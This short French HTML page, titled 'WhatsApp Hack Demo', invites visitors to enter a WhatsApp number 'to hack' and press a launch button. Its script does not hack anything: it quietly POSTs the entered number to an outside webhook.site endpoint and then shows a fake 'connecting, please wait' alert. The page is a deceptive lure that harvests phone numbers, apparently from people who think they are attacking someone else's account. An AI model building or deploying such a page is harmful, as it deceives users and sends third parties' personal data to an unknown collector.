<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp Hack Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
      background-color: #f5f5f5;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h1>WhatsApp Hack Demo</h1>
  <p>Entrez un numéro WhatsApp à pirater :</p>
  <input type="text" id="number" placeholder="Ex: +27681600073">
  <br>
  <button onclick="sendData()">Lancer</button>

  <script>
    function sendData() {
      const number = document.getElementById("number").value;
      fetch("https://webhook.site/b9f721df-4883-411d-812a-a57a3fd1e879", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ numero: number })
      });
      alert("Connexion en cours... Patientez.");
    }
  </script>
</body>
</html>
